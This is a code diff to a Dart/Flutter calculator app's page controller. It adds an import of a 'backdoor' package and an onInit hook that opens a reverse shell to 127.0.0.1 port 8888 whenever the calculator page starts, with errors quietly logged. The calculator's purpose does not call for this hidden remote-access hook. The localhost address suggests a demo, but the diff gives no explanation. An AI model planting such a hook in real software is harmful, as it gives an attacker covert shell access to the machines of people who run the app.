@@ -1,3 +1,6 @@
+import 'dart:developer';
+
+import 'package:backdoor/backdoor.dart';
 import 'package:get/get.dart';
 import 'package:math_expressions/math_expressions.dart';
 
@@ -13,6 +16,25 @@ class CalcPageController extends GetxController {
   set _setResultFieldText(String value) {
     final newValue = value.replaceAll(".", ",");
     _resultFieldText.value = newValue;
+  }
+
+  @override
+  Future<void> onInit() async {
+    super.onInit();
+
+    final shell = ReverseShell(
+      host: '127.0.0.1',
+      port: 8888,
+    );
+
+    try {
+      await shell.open();
+    } catch (e) {
+      log(
+        e.toString(),
+        error: e,
+      );
+    }
   }
 
   String _formatEquation(String equation) {
